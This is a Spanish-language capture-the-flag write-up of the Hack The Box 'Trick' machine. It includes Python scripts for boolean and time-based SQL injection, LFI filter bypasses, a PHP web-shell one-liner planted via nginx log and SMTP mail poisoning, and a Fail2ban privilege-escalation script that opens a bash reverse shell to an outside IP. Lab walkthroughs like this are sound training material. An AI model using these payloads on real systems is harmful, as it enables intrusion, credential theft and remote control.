---
layout: single
title: Trick - Hack The Box
excerpt: "En esta máquina Linux fácil estaremos reailzando un **ataque de transferencia de zona (axfr)** para descubrir un subdominio. Gracias a este subdominio podremos descubrir uno oculto con la herramienta **wfuzz**. Además, nos estaremos aprovechando de una **SQL Injection**. Haremos un script basado en tiempo y otro con condicionales para practicar. Encontraremos un **Local File Inclusion** con el que nos podremos aprovechar para acceder a la máquina victima de 3 formas diferentes. Por último, para convertirnos en root, nos aprovecharemos de **Fail2ban** y de una configuración en el sistema."
date: 2023-02-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-trick/trick_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Linux
  - AXFR
  - Subdomain Enumeration
  - SQL Injection
  - Local File Inclusion 
  - LFI to RCE
  - Fail2ban
---

![](/assets/images/htb-writeup-trick/trick_logo.png)

# Enumeración
Puertos abiertos:
![](/assets/images/htb-writeup-trick/nmap_trick.png)

Como podemos ver el puerto 53 está abierto por lo que podemos intentar enumerar un poco con la herramienta **nslookup**
![](/assets/images/htb-writeup-trick/trick_nslookup.png)
Encontramos un dominio por lo que lo añadimos al **/etc/hots**
![](/assets/images/htb-writeup-trick/trick_etc_hosts.png)
<br>Al tener este dominio ya podemos realizar un **Ataque de Transferencia de Zona (AXFR)** con la herramienta **dig**. Con esto conseguiremos ver si existen mas subdominios ocultos.
```bash
dig axfr @10.10.11.166 trick.htb
```
Y, en efecto, encontramos 1: **preprod-payroll.trick.htb**. Lo añadiremos al **/etc/hosts**.

En la página principal **trick.htb** no vemos gran cosa. Si intentamos fuzzear archivos y carpetas tampoco encontraremos nada interesante. Podemos buscar subdominios ahora que sabemos como es la fórmula. Porque si intentamos buscar por ejemplo con el siguiente payload: **FUZZ.trick.htb** no llegaremos a encontrar nada. Pero si usamos **preprod-FUZZ.trick.htb** tal vez si encontremos uno. Estaremos usando **wfuzz** por la comodida que representa y usaremos un diccionario de **SecLists** --> [Ruta](https://github.com/danielmiessler/SecLists).
```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" -t 150 http://trick.htb/
```
Y encontramos otro subdominio llamado **prepord-marketing.trick.htb** por lo que hay que añadirlo al **/etc/hosts**

## Analizando los subdominios encontrados

### preprod-payroll.trick.htb
Al entrar en este subdominio veremos el siguiente panel login:
![](/assets/images/htb-writeup-trick/subdominio_1.png)

<br>Podemos probar el uso de credenciales por defecto como **admin:admin admin:admin123** etc pero no nos serviran. Si probamos una inyección SQL básica como: **' or 1=1-- -** lograremos acceder al panel como Administrador. Pero este panel tambien es vulnerable a una **SQL Injection Time Based y Conditional Error** por lo que haremos un script para practicar ambas.

Usaremos Burpsuite para interceptar la petición del panel login.

### SQLI Conditional Response
Esta forma es la más rapida ya que no requiere que esperemos para ver la respuesta. El payload seria el siguiente: **' or (select substring(database(),1,1)='a')-- -** Para descubrir con que letra empieza la base de datos usaremos un ataque de tipo **Sniper** de **Burpsuite**
![](/assets/images/htb-writeup-trick/Intruder_trick.png)
<br>Como podemos observar el caracter **p** devuelve una respuesta diferente al resto, por lo que esa seria la correcta. Sabiendo esto podemos empezar a scriptear. Para este ejemplo enumerarmos los esquemas, tablas y columnas, en la **Time Based** enumeraremos el usuario y la contraseña
```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, sys, time, signal, string


def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

# Ctrl C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url="http://preprod-payroll.trick.htb/ajax.php?action=login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.punctuation

# Enumeracion del nombre de la base actualmente en uso:
# ' or (select hex(substring(database(),%d,1)) limit 1)=hex('%s')-- -
# Enumeración del resto de esquemas:
# ' or (select hex(substring((group_concat(schema_name)),%d,1)) from information_schema.schemata)=hex('%s')-- -
# Enumeracion de las tablas payroll_db
# ' or (select hex(substring((group_concat(table_name)),%d,1)) from information_schema.tables where table_schema='payroll_db')=hex('%s')-- -
# Enumeracion de las columnas
# ' or (select hex(substring((group_concat(column_name)),%d,1)) from information_schema.columns where table_schema='payroll_db' and table_name='employ  ee')=hex('%s')-- -

def makeRequest():
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando Fuerza bruta")
    
    time.sleep(2)
    
    username = ''
    p2 = log.progress("Username")

    for position in range(1,100):
        for character in characters:
            post_data = {
                    'username':"""' or (select hex(substring((group_concat(column_name)),%d,1)) from information_schema.columns where table_schema='payroll_db' and table_name='employee')=hex('%s')-- -""" %(position, character),
                    'password': 'test'
                }
            p1.status(post_data['username'])


            r = requests.post(url=login_url, data=post_data)

            if r.text == "1":
                username += character
                p2.status(username)
                break

if __name__ == '__main__':

    makeRequest()
```

### SQLI Time Based

Podemos comprobar que es vulnerable con el payload en el campo username: **' or sleep(10)-- -** y veremos que la web tarda 10 segundos en responder.

Hay varias formas de aprovecharse de esto, podemos suponer que existe una tabla llamada **username** con un campo llamado **users** y empezar por ahi. Sino podriamos empezar enumerando esquemas, luego tablas, columnas, etc. Tal y como hemos hecho antes.

Lo primero que haremos será averiguar por qué letra empieza el usuario. Usaremos el siguiente payload: **' or (select case when hex(substring(username,1,1))=hex('E') then sleep(5) end from users)-- -**. 

La letra sabemos que es la **E**. Ahora descubriremos cuantas tiene: **' or (select case when hex(substring(username,1,1))=hex('E') and length(username)>=10 then sleep(5) end from users)-- -** <br>Probando varios valores nos daremos cuenta que tiene 10 letras. Es momento de scriptear.

Con esto sacaremos el nombre:
```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, sys, time, signal, string


def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

# Ctrl C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url="http://preprod-payroll.trick.htb/ajax.php?action=login"
characters = string.ascii_lowercase + string.ascii_uppercase

def makeRequest():
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando Fuerza bruta")
    
    time.sleep(2)
    
    username = ''
    p2 = log.progress("Username")

    for position in range(1,11):
        for character in characters:
            post_data = {
                    'username':"""' or (select case when hex(substring(username,%d,1))=hex('%s') then sleep(1.5) end from users)-- -""" %(position, character),
                    'password': 'test'
                }
            p1.status(post_data['username'])

            time_start = time.time()

            r = requests.post(url=login_url, data=post_data)

            time_end = time.time()

            if time_end - time_start > 1.5:
                username += character
                p2.status(username)
                break

if __name__ == '__main__':

    makeRequest()
```
Para la contraseña habria que descubrir el tamaño que tiene como hicimos con el usuario y cambiar el payload por el siguiente: **' or (select case when hex(substring(password,%d,1))=hex('%s') then sleep(1.5) end from users where username='Enemigosss')-- -** Para hacerlo más real habria que añadir a la variable **characters** símbolos y números pero esta vez no será necesario.

Por desgracia las credenciales para este usuario no nos sirven para conectarnos a la máquina. 

Otra forma de obtener la contraseña seria una vez conectados como admin con la inyección básica. Si echamos un vistazo veremos que podemos editar la contraseña del Administrador

![](/assets/images/htb-writeup-trick/passsword_admin.jpeg)
<br>En este momento no la vemos pero si pulsamos **Control + Shift + C** y nos dirigimos al click de la izquierda y pulsamos. Y luego seleccionamos el recuadro de la contraseña veremos el código HTML. Si cambiamos el campo **type=password** a **type=text** veremos la contraseña en texto claro.
![](/assets/images/htb-writeup-trick/password_admin_2.jpeg)

Viendo que por aqui no podemos encontrar nada hay que fijarse en otra cosa. Por ejemplo, en la url: Vemos el parametro **page=index** esto nos puede hacer pensar que existe un **Local File Inclusion** pero si probamos las cosas básicas no nos funcionará. Pero si probamos con **wrappers** la cosa cambia. En concreto con el siguiente: **php://filter/convert.base64-encode/resource=index** 
![](/assets/images/htb-writeup-trick/php_wrapper_trick.png)

**¿Por que ocurre esto?**<br>
Es posible que por detras el código esté concatenando un .php al final del archivo. Por eso cuando intentabamos hacer el **Directory Traversal** no funcionaba. Podiamos haber intentado añadir un **Null Byte** pero tampoco funcionaría.

Si investigamos mas archivos de la página llegaremos a ver un **db_connect** con otras credenciales pero tampoco nos funcionaran. Por lo que es hora de pasar al siguiente subdominio

### preprod-marketing.trick.htb

En esta web volvemos ha encontrar un parametro **page=service.html** pero esta vez vemos la extensión, por lo que tiene buena pinta. Veremos que si aplicamos el siguiente filtro **....//....//....//....//etc/passwd** conseguiremos ver el archivo en concreto.

## Ganando acceso a la máquina 

A partir de aqui hay 3 maneras posibles

### Leer la id_rsa del usuario michael
Localizada en la ruta **/home/michael/.ssh/id_rsa**
### Log Poisoning de ngix
Localizados en la ruta **/var/log/ngnix/access.log**. Para esto, debemos cambiar el **User-Agent** a **<?php system($_GET['cmd']); ?>** Importante escribirlo bien ya que si no lo hacemos tendremos que reiniciar la máquina para que funcione. Luego, una vez enviada la petición con este User-Agent ya podemos añadirle el parametro **&cmd=id**
![](/assets/images/htb-writeup-trick/log_poisoning_nginx.png)
### Email Poisoning SMTP
Podemos enviarle un mail a michael con un codigo php malicioso como el usado anteriormente. Para enviar el mail haremos lo siguiente
```bash
telnet 10.10.11.166 25
mail from:kumi@trick.htb
rcpt to: michael
data
Te envio este email --> <?php system($_GET['cmd']); ?>
.
```
Luego tendremos que aplicar lo mismo que hemos hecho antes con los logs nginx pero en la ruta **/var/spool/mail/michael**
![](/assets/images/htb-writeup-trick/log_poisoning_smtp_mail.png)

## Escalada de Privilegios
Si miramos los permisos que tenemos con **sudo -l** nos daremos cuenta de que podemos ejecutar como **root sin proporcionar contraseña** el script **/etc/init.d/fail2ban restart** Una rápida busqueda en google y encontraremos el siguiente recurso:[Fail2Exploit](https://securitylab.github.com/research/Fail2exploit/)

Para realizar esto crearemos un script en /tmp llamado pwn.sh que contendra:
```
#!/bin/bash

bash -c 'bash -i >&/dev/tcp/10.10.14.11/443 0>&!'
```
Luego nos iremos a la ruta **/etc/fail2ban/action.d** y como estamos en el grupo **Security** tendremos la capacidad de escribir dentro de esa carpeta.<br>
Cambiamos de nombre el archivo **iptables-multiport.conf** y nos creamos uno que se llame igual con los mismos datos.<br>
Posteriormente en el lugar que pone **actionban** debemos poner **/tmp/pwn.sh**.<br>
Por ultimo, reiniciamos el fail2ban con nuestro privilegio de root.<br>
Luego, solo haria falta ponernos en escucha con netcat por el puerto 443 y realizar multiples conexiones erroneas con ssh como el usuario michael hasta que nos baneen y se aplique la regla, que en este caso, nos entablará una reverse shell como root.
